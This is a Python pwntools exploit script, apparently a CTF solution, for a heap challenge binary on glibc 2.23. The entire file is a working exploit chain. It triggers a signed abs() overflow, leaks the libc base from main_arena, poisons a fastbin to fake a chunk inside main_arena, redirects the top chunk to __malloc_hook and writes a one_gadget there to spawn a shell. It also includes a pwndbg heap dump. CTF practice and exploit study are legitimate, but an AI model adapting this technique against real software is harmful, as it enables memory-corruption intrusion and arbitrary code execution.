#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
#context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[0x11fb]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

io = process('./pwn')#   , env = {'LD_PRELOAD':'./libc-2.23.so'})
# libc = ELF('./libc.so')
# libc = ELF('/glibc/2.23/64/lib/libc-2.23.so')
mainarena = 0x3c4b20
malloc_hook = 0x3c4b10
onegadget = 0xf1147

def add(size, content):
    io.sendlineafter('xit\n',  '1')
    io.sendlineafter('ize:\n', str(size))
    if len(content) < size*0x10+0x10:
        content+='\n'
    io.sendafter('ent:\n', content)

def update(index, loc, content):
    io.sendlineafter('xit\n', '2')
    io.sendlineafter('?\n', str(index))
    io.sendlineafter('?\n', str(loc))
    io.sendlineafter(':\n', content)

def view(index):
    io.sendlineafter('xit\n', '4')
    io.sendlineafter('?\n', str(index))

def delete(index):
    io.sendlineafter('xit\n', '3')
    io.sendlineafter('?\n', str(index))


if __name__ == '__main__':
    add(1, 'a'*0x20) # 0   
    add(2, 'b'*0x30) # 1   # 0x50 v
    add(2, 'c'*0x30) # 2   
    add(3, 'd'*0x40) # 3
    add(1, 'e'*0x20) # 4
    # debug()
    payload = 'f' * 0x18 + p64(0xd1)
    update(1, 0x80000000, payload) # 0x80000000 for abs() is vuln

    # debug()
    delete(1)
    add(1, 'address') # 5
    view(5)
    io.recvuntil('address\n')
    libcbase = u64(io.recv(6).ljust(8, '\x00')) - mainarena - 280
    success('libcbase', libcbase)


    add(2, p64(0) + p64(0x41)) # 6
    add(3, p64(0) + p64(0x51)) # 7

    debug()
    # change fd of 0x50 in fastbin to mainarena+0x10
    delete(3)
    update(7, 0, p64(0) + p64(0x51) + p64(libcbase + mainarena + 0x10))

    # make a fake chunk in mainarena
    delete(2)
    update(6, 0, p64(0) + p64(0x41) + p64(0x51))

    # waste the bin in 0x40, to make fd is 0x50 as size
    add(2, 'iiii')
    add(3, 'jjjj')
    '''
    pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x51 (invaild memory)
(0x50)     fastbin[3]: 0x7ffac6535b30 --> 0x7ffac6535b30 (overlap chunk with 0x7ffac6535b30(freed) )
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55b2ecda5130 (size : 0x20ed0) 
       last_remainder: 0x55b2ecda50a0 (size : 0x60) 
            unsortbin: 0x0

    '''


    add(3, p64(0) * 7 + p64(malloc_hook+libcbase-0x24)) # top chunk point to malloc_hook-0x10
    #                   top: 0x7ffac6535aec (size : 0x7ff8) 

    add(3, 'a' * 20 + p64(onegadget+libcbase))
    add(1, 'go!')
    io.recv()
    io.interactive()
    io.close()

